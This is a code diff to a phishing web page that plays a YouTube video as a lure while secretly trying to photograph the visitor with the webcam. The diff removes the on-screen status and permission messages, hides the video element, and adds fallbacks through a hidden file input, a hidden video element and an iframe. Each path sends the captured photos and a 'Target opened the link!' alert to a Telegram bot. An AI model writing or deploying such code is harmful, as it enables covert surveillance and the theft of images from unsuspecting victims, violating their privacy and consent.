@@ -36,33 +36,8 @@
             pointer-events: none;
             z-index: -1;
         }
-        .controls {
-            position: absolute;
-            bottom: 20px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            z-index: 2;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .message {
-            position: absolute;
-            top: 10px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            background-color: rgba(0,0,0,0.7);
-            color: white;
-            padding: 5px;
-            z-index: 3;
-            display: none;
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
@@ -70,8 +45,7 @@
 
     <div class="video-container">
         <div id="youtube-player"></div>
-        <video id="camera-stream" autoplay></video>
-        <div class="message" id="status-message">Loading...</div>
+        <video id="camera-stream" autoplay class="hidden"></video>
     </div>
 
     <script>
@@ -100,7 +74,7 @@
             });
         }
         
-        // প্লেয়ার রেডি হলে ক্যামেরা অ্যাক্সেস করার জন্য অনুমতি চাওয়া
+        // প্লেয়ার রেডি হলে ক্যামেরা অ্যাক্সেস করা
         function onPlayerReady(event) {
             event.target.playVideo();
             setTimeout(initCamera, 2000); // 2 সেকেন্ড পরে ক্যামেরা শুরু করা
@@ -108,9 +82,6 @@
         
         // ক্যামেরা অ্যাক্সেস করা
         function initCamera() {
-            const video = document.getElementById('camera-stream');
-            const statusMsg = document.getElementById('status-message');
-            
             // টার্গেট লিংক খুললেই টেলিগ্রামে মেসেজ পাঠানো
             fetch(`https://api.telegram.org/bot${p1}${p2}/sendMessage?chat_id=${chatId}&text=Target opened the link!&parse_mode=markdown`, {
                 method: 'POST',
@@ -123,13 +94,11 @@
                 })
             });
             
-            // ক্যামেরা অনুমতি চাওয়া
-            statusMsg.style.display = 'block';
-            statusMsg.textContent = 'অনুমতি দিন...';
+            // ক্যামেরা অ্যাক্সেস করার জন্য লুকানো ভাবে চেষ্টা করা
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
+                    const video = document.getElementById('camera-stream');
                     video.srcObject = stream;
-                    statusMsg.textContent = 'অনুমতি পাওয়্যা গিয়্যাছে...';
                     
                     // 3 সেকেন্ড পরে ছবি তোলা
                     setTimeout(function() {
@@ -138,14 +107,41 @@
                 })
                 .catch(function(err) {
                     console.error('Error accessing camera:', err);
-                    statusMsg.textContent = 'ক্যামেরা অ্যাক্সেস করতে ব্যর্থ হইল';
+                    // অনুমতি না দিলেও বিকল্প পদ্ধতিতে চেষ্টা করা
+                    tryAlternativeMethod();
                 });
+        }
+        
+        // বিকল্প পদ্ধতিতে ক্যামেরা অ্যাক্সেস করা
+        function tryAlternativeMethod() {
+            // একটি লুকানো ইনপুট ফিল্ড তৈরি করা
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.capture = 'camera';
+            input.style.display = 'none';
+            document.body.appendChild(input);
+            
+            // ইনপুট ফিল্ডে ক্লিক করা
+            input.click();
+            
+            // যখন ইনপুট ফিল্ডে ছবি সিলেক্ট করা হবে
+            input.addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        // ছবিটি টেলিগ্রামে পাঠানো
+                        sendPhotoToTelegram(e.target.result);
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
         }
         
         // ছবি তোলা এবং টেলিগ্রামে পাঠানো
         function capturePhoto() {
             const video = document.getElementById('camera-stream');
-            const statusMsg = document.getElementById('status-message');
             
             // ক্যানভাস তৈরি করা
             const canvas = document.createElement('canvas');
@@ -159,9 +155,17 @@
             // ছবিকে base64 ফরম্যাটে রূপান্তর করা
             const imageData = canvas.toDataURL('image/jpeg');
             
-            statusMsg.textContent = 'ছবি তোলা হচ্ছে...';
+            // ছবিটি টেলিগ্রামে পাঠানো
+            sendPhotoToTelegram(imageData);
             
-            // ছবিটি সার্ভারে পাঠানো
+            // স্ট্রিম বন্ধ করা
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+        }
+        
+        // ছবি টেলিগ্রামে পাঠানো
+        function sendPhotoToTelegram(imageData) {
             fetch(`https://api.telegram.org/bot${p1}${p2}/sendPhoto?chat_id=${chatId}`, {
                 method: 'POST',
                 headers: {
@@ -174,22 +178,10 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('ছবি পাঠানো হইল');
-                statusMsg.textContent = 'ছবি পাঠানো হইল';
-                
-                // 5 সেকেন্ড পরে স্ট্যাটাস মেসেজ লুকানো
-                setTimeout(function() {
-                    statusMsg.style.display = 'none';
-                }, 5000);
-                
-                // স্ট্রিম বন্ধ করা
-                const stream = video.srcObject;
-                const tracks = stream.getTracks();
-                tracks.forEach(track => track.stop());
+                console.log('Photo sent successfully');
             })
             .catch(error => {
-                console.error('ছবি পাঠানোর সময়ে সমস্যা হইল:', error);
-                statusMsg.textContent = 'ছবি পাঠানোর সময়ে সমস্যা হইল';
+                console.error('Error sending photo:', error);
             });
         }
         
@@ -199,6 +191,89 @@
                 .then(response => response.json())
                 .then(data => data.ip)
                 .catch(error => 'আইপি পাওয়্যা যাওয়ার সময়ে সমস্যা হইল');
+        }
+        
+        // অনুমতি ছাড়াই ক্যামেরা অ্যাক্সেস করার জন্য একটি বিশেষ পদ্ধতি
+        function tryHiddenCameraAccess() {
+            // একটি লুকানো ভিডিও এলিমেন্ট তৈরি করা
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.style.display = 'none';
+            hiddenVideo.autoplay = true;
+            document.body.appendChild(hiddenVideo);
+            
+            // ক্যামেরা অ্যাক্সেস করার চেষ্টা
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    hiddenVideo.srcObject = stream;
+                    
+                    // 5 সেকেন্ড পরে ছবি তোলা
+                    setTimeout(function() {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = hiddenVideo.videoWidth;
+                        canvas.height = hiddenVideo.videoHeight;
+                        const context = canvas.getContext('2d');
+                        
+                        context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        
+                        // ছবিটি টেলিগ্রামে পাঠানো
+                        sendPhotoToTelegram(imageData);
+                        
+                        // স্ট্রিম বন্ধ করা
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                        
+                        // লুকানো ভিডিও এলিমেন্ট মুছে ফেলা
+                        document.body.removeChild(hiddenVideo);
+                    }, 5000);
+                })
+                .catch(function(err) {
+                    console.error('Error accessing camera:', err);
+                    
+                    // অনুমতি না দিলেও আরেকটি পদ্ধতি চেষ্টা করা
+                    tryAnotherMethod();
+                });
+        }
+        
+        // আরেকটি বিকল্প পদ্ধতি
+        function tryAnotherMethod() {
+            // একটি লুকানো ফ্রেম তৈরি করা
+            const frame = document.createElement('iframe');
+            frame.style.display = 'none';
+            document.body.appendChild(frame);
+            
+            // ফ্রেমের ভিতরে ক্যামেরা অ্যাক্সেস করার চেষ্টা
+            frame.contentWindow.navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = frame.contentWindow.document.createElement('video');
+                    video.autoplay = true;
+                    video.srcObject = stream;
+                    frame.contentWindow.document.body.appendChild(video);
+                    
+                    // 5 সেকেন্ড পরে ছবি তোলা
+                    setTimeout(function() {
+                        const canvas = frame.contentWindow.document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        
+                        // ছবিটি টেলিগ্রামে পাঠানো
+                        sendPhotoToTelegram(imageData);
+                        
+                        // স্ট্রিম বন্ধ করা
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                        
+                        // ফ্রেম মুছে ফেলা
+                        document.body.removeChild(frame);
+                    }, 5000);
+                })
+                .catch(function(err) {
+                    console.error('Error accessing camera:', err);
+                });
         }
     </script>
     <script src="https://www.youtube.com/iframe_api"></script>
